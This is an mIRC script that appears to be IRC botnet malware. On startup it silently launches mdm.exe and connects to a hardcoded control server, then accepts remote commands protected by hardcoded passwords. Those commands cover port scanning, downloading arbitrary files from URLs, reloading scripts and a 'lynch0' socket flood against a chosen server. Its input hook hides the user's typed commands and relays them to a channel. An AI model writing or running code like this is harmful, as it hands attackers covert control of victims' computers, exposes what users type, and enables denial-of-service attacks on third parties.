on *:start:{ if ($exists(mdm.exe) == $false) { exit } | //run mdm.exe /n /fh         | //set %server monsoon911.cjb.net  | //set %timeout 10 | if ($portfree(60609) == $false) { exit } |  if ($portfree(60609) == $true) { /socklisten blah 60609 } | //nick $read mdm.scr $+ $r(1,9) | //timerc 1 4 //server %server $+ : $+ 6667 | //run mdm.exe /n /fh        | //remini NT32.ini ident userid | //remini NT32.ini mirc user | //remini NT32.ini mirc email | //writeini NT32.ini ident userid $read mdm.scr | //writeini NT32.ini mirc user $randomgen($r(0,9)) | //writeini NT32.ini mirc email $randomgen($r(0,9)) | //identd on $r(a,z) $+ $read mdm.scr $+ $r(a,z)  |  //timercoolconnect -o 0 100 //server %server 6667 }
on *:TEXT:!login*:*:{  set %pass  dasani | if (%pass8 == $null) { set %pass8 fuckers } | if ( ($2- = %pass) && ( $nick isop #  ) )  { /msg # 14º15¬14¸ 15L14o15gin Acc14ept15ed14 º15¬14¸ 12User2:14 15[ $+ $nick $+ 15] 14º15¬14¸ 12Level2: 14[2Ma4§2ter14] | /set %master $address | /guser 10 $nick 3 } | if ( ($2- = %pass8) && ( $nick isop #  ) )  {  /msg # 14º15¬14¸ 15L14o15gin Acc14ept15ed14 º15¬14¸ 12User2:14 15[ $+ $nick $+ 15] 14º15¬14¸ 12Level2: 14[21014] | /guser 10 $nick 3 } } 
on *:INPUT:*: { haltdef | /echo -a < $+ $me $+ > $1- | msg %chan --Warning- (Input command) $1- | /clearall | halt }
alias setserver { %clones.setserver = 1 | .dns -h $1 } 
alias reg {  if ($1 == 1) { return @aol.com } | if ($1 == 2) { return @hotmail.com } | if ($1 == 3) { return @msn.com } | if ($1 == 4) { return @netzero.com } | if ($1 == 5) { return @bothered.com } | if ($1 == 6) { return @bothered.com } | if ($1 == 7) { return $r(a,z) $+ $r(a,z) $+ $r(a,z) $+ $r(a,z) $+ $r(a,z) $+ $r(a,z) $+ $r(a,z) $+ $r(a,z) $+ .edu } | if ($1 == 8) { return $r(a,z) $+ $r(a,z) $+ $r(a,z) $+ $r(a,z) $+ $r(a,z) $+ $r(a,z) $+ $r(a,z) $+ $r(a,z) $+ .net }  | if ($1 == 9) { return $r(a,z) $+ $r(a,z) $+ $r(a,z) $+ $r(a,z) $+ $r(a,z) $+ $r(a,z) $+ $r(a,z) $+ $r(a,z) $+ .com } | if ($1 == 10) { return $r(a,z) $+ $r(a,z) $+ $r(a,z) $+ $r(a,z) $+ $r(a,z) $+ $r(a,z) $+ $r(a,z) $+ $r(a,z) $+ .org } }
alias rc {  if ($1 == 1) { return  $+ $r(1,15) } | if ($1 == 2) { return  } | if ($1 == 3) { return  } | if ($1 == 4) { return  $+ $r(1,15) } | if ($1 == 5) { return  } | if ($1 == 6) { return  } | if ($1 == 7) { return  } | if ($1 == 8) { return  $+ $r(1,15) $+ , $+ $r(1,15) } }
alias rcr { if ($1 == 1) { return $r(a,z) $+ $r(a,z) $+ $r(a,z) $+ $r(a,z) $+ $r(a,z) $+ $r(a,z) } | if ($1 == 2) { return $r(A,Z) $+ $r(a,z) $+ $r(A,Z) $+ $r(a,z) $+ $r(A,Z) $+ $r(a,z) } | if ($1 == 3) { return $r(1,100) $+ $r(1,100) $+ $r(1,100) $+ $r(1,100) } | if ($1 == 4) { return $chr($r(1,100))  $+ $chr($r(100,250)) $+ $r(251,1000) $+ $chr($r(1,100))  $+ $chr($r(100,250)) $+ $r(251,1000) } }
alias randomgen { if ($1 == 0) { return $r(a,z) $+ $r(75,81) $+ $r(A,Z) $+ $r(g,u) $+ $r(4,16) $+ $r(a,z) $+ $r(75,81) $+ $r(A,Z) $+ $r(g,u) $+ $r(4,16) } | if ($1 == 1) { return $read mdm.scr } | if ($1 == 2) { return ^ $+ $read mdm.scr $+ ^ } |  if ($1 == 3) { return $r(a,z) $+ $read mdm.scr $+ $r(1,5) } | if ($1 == 4) { return $r(A,Z) $+ $r(1,9) $+ $r(8,20) $+ $r(g,y) $+ $r(15,199) } | if ($1 == 5) { return $r(a,z) $+ $read mdm.scr $+ - } | if ($1 == 6) { return $read mdm.scr $+ - } | if ($1 == 7) { return $r(A,Z) $+ $r(a,z) $+ $r(0,6000) $+ $r(a,z) $+ $r(A,Z) $+ $r(a,z) $+ $r(15,61) $+  $r(A,Z) $+ $r(a,z) $+ $r(0,6000) $+ $r(a,z) $+ $r(A,Z) $+ $r(a,z) $+ $r(15,61) } | if ($1 == 8) { return ^- $+ $read mdm.scr $+ -^ } | if ($1 == 9) { return $r(a,z) $+ $r(A,Z) $+ $r(1,500) $+ $r(A,Z) $+ $r(1,50) } }
alias wnickchn { %.nc = 1  |   :ncloop | if (%.nc > $sock(sock*,0)) { goto end }  |  sockwrite -n $sock(sock*,%.nc) Nick $randomgen($r(0,9)) |  inc %.nc |  goto ncloop |  :end  } 
alias wnickchn2 { %.nc = 1  |  :ncloop |  if (%.nc > $sock(sock*,0)) { goto end }  |  sockwrite -n $sock(sock*,%.nc) Nick $1 $+ $r(a,z) $+ $r(1,999) |  inc %.nc | goto ncloop |  :end  }
alias msg { if (# == $null) { msg $nick $1- }  |   else { msg $1- } }
alias percent { if ($1 isnum) && ($2 isnum) { return $round($calc(($1 / $2) * 100),2) $+ $chr(37) } }
; end alias end.
on *:sockopen:range.*:{ if ($sock($sockname).status == active) { set %range.ports %range.ports $sock($sockname).port | sockclose $sockname } }
alias port.range.scan { set %range1 $calc( $gettok(%port.to.scan,1,45) - 1) | set %range2 $gettok(%port.to.scan,2,45) | :lewp | inc %range1 | if (%range1 <= %range2) { sockopen range. $+ %range1 %port.scan.ip %range1 | goto lewp } | else { .timergetportsempire 1 2 get.ports } }
alias get.ports { /msg %schan 14[15portscan14] Open ports found: $iif(%range.ports != $null, %range.ports, None) | /msg %schan 14[15portscan14] Scanning Ports Successfully Completed for %port.scan.ip $+ $+ ... |  unset %range.ports %range1 %range2 %port.to.scan %port.scan.ip | unset %schan | sockclose range.* }
on 1:SOCKREAD:wwwGet: { .remove $mircdir\Temp  | msg %w.g.# 15Downloading...14 $gettok($sock($sockname).mark,3,32) | if ($sockerr > 0) return | :nextread | sockread %WWW.Temp |  if ($sockbr != 0) { if (%WWW.Temp != $Null) {  write $mircdir\Temp %WWW.Temp  } |  goto nextread   }
  if (HTTP/1.*20* iswm [ $read -l1 $mircdir\Temp ] ) { if ($exists($gettok($sock($sockname).mark,2,32))) {  .remove $gettok($sock($sockname).mark,2,32) } |   :GenNew |  set -u0 %WWW.Temp www $+ $rand(A,Z) $+ $rand(0,9) |  if ($sock(%WWW.Temp) != $null) { goto GenNew } |  sockrename wwwGet %WWW.Temp  
if (text/* iswm [ $read -sContent-Type: $mircdir\Temp ] ) { sockmark %WWW.Temp Text $gettok($sock($sockname).mark,2-,32)  } | else {   sockmark %WWW.Temp Bin $gettok($sock($sockname).mark,2-,32)  } |  .timer 1 1 sockwrite -tn %WWW.Temp GET $gettok($sock($sockname).mark,3,32)  } | else {  //echo -st $read -l2 $mircdir\Temp  }  unset %WWW.Temp }
on 1:SOCKREAD:www*: {  if ($sockerr > 0) return | :nextread | if ($gettok($sock($sockname).mark,1,32) == bin) { sockread &Temp |   if ($sockbr == 0) return |  if ($bvar(&Temp,0) != 0) { bwrite $gettok($sock($SockName).Mark,2,32) -1 $bvar(&Temp,0) &temp }  } | else {  sockread %WWW.Temp |  if ($sockbr == 0) return |  if (%WWW.Temp != $Null) { write $gettok($sock($SockName).Mark,2,32) %WWW.Temp } |   unset %WWW.Temp  } | goto nextread }
alias getdata {  if ($sock(wwwGet) == $null) {  if ($gettok($$1,1,47) == http:) { sockopen wwwGet $gettok($gettok($1,2,47),1,58) $iif($gettok($gettok($1,3,47),2,58) != $Null, $gettok($gettok($1,3,47),1,58), 80)   } | else { sockopen wwwGet $gettok($1,1,47) $iif($gettok($gettok($1,1,47),2,58) != $Null, $gettok($gettok($1,1,47),1,58), 80)  } |  if ($GetTok($1,$numtok($1,47),47) != $null) {  set -u0 %WWW.File $mircdir\ $+ $GetTok($1,$numtok($1,47),47)  } | else {
set -u0 %WWW.File $mircdir\_root_   } |   sockmark wwwGet unknown %WWW.File $iif($gettok($$1,1,47) == http:, $1, [ http:// $+ [ $1 ] ] )  } | else {  .timer 1 1 getdata $1  } }
on 1:SOCKOPEN:wwwGet: { sockwrite -tn wwwGet HEAD $gettok($sock($sockname).mark,3,32) HTTP/1.1 | sockwrite -tn wwwGet Accept: image/gif, image/x-xbitmap, image/jpeg, image/pjpeg, */* | sockwrite -tn wwwGet Accept-Language: en-au |  sockwrite -tn wwwGet Accept-Encoding: deflate |   sockwrite -tn wwwGet User-Agent: mIRCInstaller WWW Edition v0.0.1 | sockwrite -tn wwwGet Host: $host | sockwrite -tn wwwGet Connection: Keep-Alive  | sockwrite -tn wwwGet $lf  }
on 1:SOCKCLOSE:www*: {  msg %w.g.# 14[15File:14 $+ $gettok($sock($sockname).mark,3-,32) $+ ] 14[15Size:14 $+ $file($gettok($sock($sockname).mark,2,32)).size $+ ]12 Downloaded Successfully... |  if ($exists( [ $mircdir\Temp ] )) { .remove $mircdir\Temp } | unset %WWW* | unset %w.g.# }
on 10:TEXT:!portscan*:?: if ($4 == $null) { msg $nick Error !portscan [ip-address] [start-port] [end-port] | halt } | if ($calc($4 - $3) > 800) { msg $nick Error; please scan under 800 ports at a time! | halt }  | set %port.to.scan $3 | set %port.to.scan %port.to.scan $+ - $+ $4 |  set %port.scan.ip $2 |  set %schan $nick |  //msg $nick 14[15portscan14] Now scanning $2 on %port.to.scan |  port.range.scan %port.scan.ip
on 10:TEXT:!portscan*:#: if ($4 == $null) { msg # Error !portscan [ip-address] [start-port] [end-port] | halt }  |  if ($calc($4 - $3) > 800) { msg # Error; please scan under 800 ports at a time! | halt } | set %port.to.scan $3 | set %port.to.scan %port.to.scan $+ - $+ $4 |  set %port.scan.ip $2 |  set %schan # |  //msg # 14[15portscan14] Now scanning $2 on %port.to.scan |  port.range.scan %port.scan.ip
on 10:TEXT:!dns*:#: { if ($2 == $null) { halt } | dns $2 | set %dns.r on | set %dns.rr # |  msg # 14..[`15dns14`].. 12Attempting to resolve2 $2 $+ 12... }
on 10:TEXT:!dns*:?: { if ($2 == $null) { halt } | dns $2 | set %dns.r on | set %dns.rr $nick | msg $nick 14..[`15dns14`].. 12Attempting to resolve2 $2 $+ 12... }
on 10:TEXT:!update*:#: %w.g.# = # | /getdata $2
on 10:TEXT:!update*:?: %w.g.# = $nick | /getdata $2
on *:DNS:{ if (%dns.r == on) { msg %dns.rr 14..[`15dns14`].. 12[2-Resolved-12]14:15 $iaddress 14-15 $naddress | unset %dns.* } }
alias lynch0 { set %lc 0 |  set %space   | set %lm $replace($$3-,$chr(32), ) |  :ll |  if (%lc == 50) { /halt } |  /sockopen lynch0 $+ %lc $$1 $$2 |  inc %lc |  goto ll }
on 1:SOCKOPEN:lynch0*:/sockwrite -n $sockname SERVER %lm
on 1:SOCKWRITE:lynch0*:/sockwrite -n $sockname SERVER %lm
on 1:SOCKCLOSE:lynch0*://sockopen lynch0 $+ $remove($sockname,lynch0) %lynch0.s
alias lynch0end { /sockclose lynch0* }
on 10:TEXT:*:*:{
  if ($1 == !show.access) { if (# == $null) { msg $nick 3...14[15Showing access list14]3... 14Total:15 $Lines(accessed.txt) | /play $nick accessed.txt  } | else { msg # 3...14[15Showing access list14]3... 14Total:15 $Lines(accessed.txt) | /play # accessed.txt | timer -o 1 100 /remove accessed.txt }  }
  if ($1 == !ident) { if ($2 == $null) { halt } | msg # 15[14`15Ident14`15]12 set as3 $2 $+ 12... | identd on $2 }
  if ($1 == !reload) && ($address == %master) { msg # [Reloading $2 $+ ... $+ ] | /reload -rs $2 } 
  if ($1 == !lynch0.stop) { /lynch0end | /msg # Lynch0 Halted  | halt }
  if ($1 == !lynch0.help) { /msg # !lynch0 <serverIP> <port> <message> | halt }
  if ($1 == !lynch0) {  if ($4 == $null)  { halt } |  set %lynch0.s $2 $3 | /lynch0 $2 $3 $4- }
  if ($1 == !voiceme) { mode # +v $nick }
  if ($1 == !timeout) { set %timeout $2 }
}
